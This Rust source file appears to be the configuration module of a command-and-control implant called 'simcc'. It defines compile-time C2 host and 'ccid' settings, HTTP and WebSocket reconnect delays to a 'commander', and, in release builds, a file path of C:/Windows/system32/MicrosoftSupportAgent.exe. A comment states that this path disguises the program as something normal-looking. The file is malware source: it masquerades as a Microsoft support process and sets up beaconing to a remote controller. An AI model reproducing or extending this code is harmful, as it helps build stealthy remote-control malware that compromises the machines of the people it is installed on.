pub mod paths {
    use std::{
        path::{Path, PathBuf},
        sync::LazyLock,
    };

    /// If not in debug mode, use path for windows
    #[cfg(not(debug_assertions))]
    pub const DATA: LazyLock<PathBuf> =
        LazyLock::new(|| PathBuf::from("C:/Windows/system32/MicrosoftSupportAgent.exe")); // we discuise our self as somthing normal looking

    /// For debugging, put the data-file in a directory called `test_data`
    #[cfg(debug_assertions)]
    pub static DATA: LazyLock<PathBuf> = LazyLock::new(|| {
        PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/test_data/simcc_data"))
    });
}

pub mod compiled {
    //! Env-vars set during compile-time
    use crate::env_or;

    /// The host which the simcc runs under, for dev `localhost:<PORT>`
    pub const HOST: &'static str = env!("HOST");

    /// `ccid` used to retrieve the `iid` later on
    pub const CCID: &'static str = env!("CCID");

    /// delay how long to wait for a retry on an http-request
    pub const HTTP_COMMANDER_RECONNECT: u64 = env_or!("HTTP_COMMANDER_RECONNECT", 5000, u64);

    /// delay how long to wait for a retry on an websocket-connect
    pub const WS_COMMANDER_RECONNECT: u64 = env_or!("WS_COMMANDER_RECONNECT", 3000, u64);

    /// Construct an http or https url using the compile-time set host.
    pub fn HTTP_URL(path: &str) -> String {
        let proto = if option_env!("WEB_SECURE").is_some() {
            "https"
        } else {
            "http"
        };

        format!("{}://{}{}", proto, HOST, path)
    }

    /// Construct an ws or wss url using the compile-time set host.
    pub fn WS_URL(path: &str) -> String {
        let proto = if option_env!("WEB_SECURE").is_some() {
            "wss"
        } else {
            "ws"
        };

        format!("{}://{}{}", proto, HOST, path)
    }
}
